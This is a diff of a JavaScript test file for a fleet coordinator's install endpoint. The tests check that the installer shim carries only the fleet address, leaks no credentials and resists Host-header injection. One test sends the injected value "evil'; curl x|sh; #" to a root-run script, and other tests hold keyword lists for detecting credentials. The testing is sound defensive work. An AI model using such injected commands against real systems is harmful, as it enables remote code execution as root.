@@ -44,15 +44,93 @@ test('the privacy policy is public, because App Store Connect requires one', asy
   assert.match(String(res.headers.get('content-type')), /text\/html/);
 });
 
-test('the install one-liner redirects to whichever repository this deploy names', async () => {
+test('the install one-liner carries this fleet\'s address into the installer', async () => {
   // A box being installed has no credential — acquiring one is what the install
   // is for — so this has to sit above the token gate.
+  //
+  // It used to be a 302. The redirect could not say WHICH FLEET: somebody types
+  // `curl -fsSL https://fleet.example/install | sudo sh`, the address is right
+  // there in what they typed, and curl follows the redirect and pipes a script
+  // that has never heard of it. So the installer asked for a coordinator URL
+  // the person had already given.
   const mine = 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh';
   for (const path of ['/install', '/install.sh']) {
     const res = await get(path, { AGENT_FLEET_INSTALL_URL: mine });
-    assert.equal(res.status, 302, path);
-    assert.equal(String(res.headers.get('location')), mine);
+    assert.equal(res.status, 200, path);
+    const body = await res.text();
+    assert.match(body, /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.example'/, path);
+    assert.ok(body.includes(mine), `${path} does not fetch the installer`);
+    // Never cached: a stale shim is a box pointed at an address this fleet has
+    // moved off.
+    assert.equal(String(res.headers.get('cache-control')), 'no-store');
   }
+});
+
+test('the shim is six lines and no installer, so the source still lives in the repository', async () => {
+  // The redirect's reasoning was "the thing people paste into a root shell
+  // should be served by the place that has the source, so it cannot go stale
+  // here and cannot be edited here either". That still holds and is the reason
+  // this is a bound rather than a preference: everything except the address is
+  // fetched, so a coordinator cannot quietly grow an installer.
+  const res = await get('/install', { AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh' });
+  const body = await res.text();
+  assert.ok(body.split('\n').filter((l) => l.trim() && !l.trim().startsWith('#')).length <= 6,
+    'the /install shim has grown installer logic');
+  for (const installerish of ['apt-get', 'systemctl', 'podman', 'npm ', 'useradd']) {
+    assert.equal(body.includes(installerish), false, `the shim is doing installer work: ${installerish}`);
+  }
+});
+
+test('the shim carries an address and never a credential', async () => {
+  // THE ADDRESS IS NOT A SECRET — it is the URL somebody typed, and it is in
+  // their shell history. Joining still costs a six-digit pin, minted by a
+  // person in the app, short-lived and single-use.
+  //
+  // Asserted rather than assumed, because "the installer already knows the
+  // coordinator, why not put a token in too" is the obvious next step and it is
+  // the one that must never be taken. A static secret served to anybody who
+  // curls /install would admit any machine on the internet to the fleet, which
+  // is what AGENT_FLEET_HOST_TOKEN was and why it was removed.
+  const res = await get('/install', {
+    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh',
+    // Every credential this Worker can see, in case one is ever reached for.
+    AGENT_FLEET_API_TOKEN: 'admin-token-value-here',
+    AGENT_FLEET_GITHUB_CLIENT_SECRET: 'github-secret-value',
+    AGENT_FLEET_AUTH_ALLOW: 'somebody@example.com',
+  });
+  const body = await res.text();
+
+  for (const secret of ['admin-token-value-here', 'github-secret-value', 'somebody@example.com']) {
+    assert.equal(body.includes(secret), false, `the installer shim leaked ${secret}`);
+  }
+  // And nothing shaped like one, so a NEW credential added to the Worker cannot
+  // arrive here by being interpolated into a template somebody extends.
+  assert.equal(/token|secret|_key|bearer|authorization|pin/i.test(body), false, `the shim mentions a credential: ${body}`);
+
+  // It sets exactly one variable, and it is the address.
+  const assignments = [...body.matchAll(/^([A-Z_]+)=/gm)].map((m) => m[1]);
+  assert.deepEqual(assignments, ['AGENT_FLEET_COORDINATOR_URL']);
+});
+
+test('a forged Host header cannot reach the root shell', async () => {
+  // Without AGENT_FLEET_PUBLIC_ORIGIN the origin is whatever the client sent,
+  // and it is interpolated into a script that runs as root. normaliseOrigin
+  // returns scheme://host:port and nothing else; the charset check is the
+  // second lock on the same door.
+  const res = await worker.fetch(
+    new Request('https://fleet.example/install', { headers: { host: "evil'; curl x|sh; #" } }),
+    /** @type {any} */ ({ FLEET: noFleet, AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh' }),
+  );
+  const body = await res.text();
+  assert.equal(/curl x\|sh/.test(body), false, 'a Host header reached the script');
+
+  // And a configured public origin always wins, so a deployment that sets one
+  // never depends on the header at all.
+  const pinned = await get('/install', {
+    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh',
+    AGENT_FLEET_PUBLIC_ORIGIN: 'https://fleet.thetech.network',
+  });
+  assert.match(await pinned.text(), /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.thetech\.network'/);
 });
 
 test('an unconfigured coordinator publishes no installer at all', async () => {
@@ -74,13 +152,7 @@ test('an unconfigured coordinator publishes no installer at all', async () => {
   assert.match(text, /clones the repository it is served from/);
 });
 
-test('a redirect, not a copy of the script', async () => {
-  // The thing people paste into a root shell should be served by the place that
-  // has the source. A Worker that returned the script itself could go stale
-  // here, and could be edited here.
-  const res = await get('/install', { AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh' });
-  assert.equal((await res.text()).includes('#!/bin/sh'), false);
-});
+
 
 test('everything else refuses before the object is reached', async () => {
   // Not "we are careful" — the binding above throws, so this asserts that the
